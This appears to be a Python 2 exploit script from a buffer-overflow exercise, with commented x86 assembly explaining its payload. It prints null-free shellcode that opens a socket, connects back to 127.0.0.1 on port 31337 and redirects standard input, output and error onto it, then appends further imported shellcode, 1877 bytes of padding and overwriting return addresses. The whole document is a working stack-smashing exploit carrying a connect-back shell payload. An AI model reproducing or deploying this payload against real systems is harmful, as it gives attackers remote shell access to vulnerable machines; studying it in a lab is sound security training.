from shellcode import shellcode
print "\x55\x89\xe5\x83\xec\x04\x31\xc0\x50\x6a\x01\x6a\x02\xb8\x99\xff\xff\xff\xf7\xd0\xbb\xfe\xff\xff\xff\xf7\xd3\x89\xe1\xcd\x80\x89\x45\xfc\x83\xec\x08\xb8\x80\xff\xff\xfe\xf7\xd0\x50\x66\xb8\x7a\x69\x66\x89\x44\x24\xfe\x66\xb8\xfd\xff\x66\xf7\xd0\x66\x89\x44\x24\xfc\x83\xec\x04\x89\xe0\x6a\x10\x50\x8b\x55\xfc\x52\xb8\x99\xff\xff\xff\xf7\xd0\xbb\xfc\xff\xff\xff\xf7\xd3\x89\xe1\xcd\x80\x8b\x5d\xfc\x31\xc9\xb8\xc0\xff\xff\xff\xf7\xd0\xcd\x80\x8b\x5d\xfc\xb9\xfe\xff\xff\xff\xf7\xd1\xb8\xc0\xff\xff\xff\xf7\xd0\xcd\x80\x8b\x5d\xfc\xb9\xfd\xff\xff\xff\xf7\xd1\xb8\xc0\xff\xff\xff\xf7\xd0\xcd\x80"+\
shellcode+\
"\x01"*1877+\
"\x98\x75\xfe\xbf"+\
"\xac\x7d\xfe\xbf"



# .global main
# .section .text
# 
# main:
# 
# push	%ebp
# mov	%esp, %ebp
# sub	$4, %esp
# 
# 
# # call sys_socket
# 
# xor	%eax, %eax
# push	%eax
# push	$1
# push	$2
# 
# 
# mov	$-103, %eax		# syscall number for socketcall
# not	%eax
# mov	$-2, %ebx		# pass 1 to invoke sys_socket 
# not	%ebx			
# mov	%esp, %ecx		# arguments
# 
# 
# int	$0x80
# 
# 
# mov	%eax, -4(%ebp)		# save sockfd to -4($ebp)
# 
# 
# # call sys_connect
# 
# sub	$8, %esp
# mov	$-16777344, %eax		# 127.0.0.1
# not	%eax
# push	%eax
# movw	$0x697A, %ax		# 0x7A691102 in big-endian mode(network is big-endian), which are the combination of 31337 and 2
# movw	%ax, -2(%esp)
# movw	$-3, %ax
# not	%ax
# movw	%ax, -4(%esp)
# sub	$4, %esp
# mov	%esp, %eax		# save pointer to sockaddr
# 
# 
# push	$16			# sizeof(addr)
# push	%eax			# ptr to sockaddr
# mov	-4(%ebp), %edx
# push	%edx			# sockfd
# 
# 
# mov	$-103, %eax
# not	%eax
# mov	$-4, %ebx		# pass 3 to invoke sys_connect
# not	%ebx
# mov	%esp, %ecx
# 
# 
# int	$0x80
# 
# 
# # call dup2
# 
# mov	-4(%ebp), %ebx		# oldfd
# xor	%ecx, %ecx		# newfd
# mov	$-0x40, %eax		# sys_dup2
# not	%eax
# 
# 
# int	$0x80
# 
# 
# # call dup2
# 
# mov	-4(%ebp), %ebx		# oldfd
# mov	$-2, %ecx		# newfd
# not	%ecx
# mov	$-0x40, %eax		# sys_dup2
# not	%eax
# 
# 
# int	$0x80
# 
# 
# # call dup2
# 
# mov	-4(%ebp), %ebx		# oldfd
# mov	$-3, %ecx		# newfd
# not	%ecx
# mov	$-0x40, %eax		# sys_dup2
# not	%eax
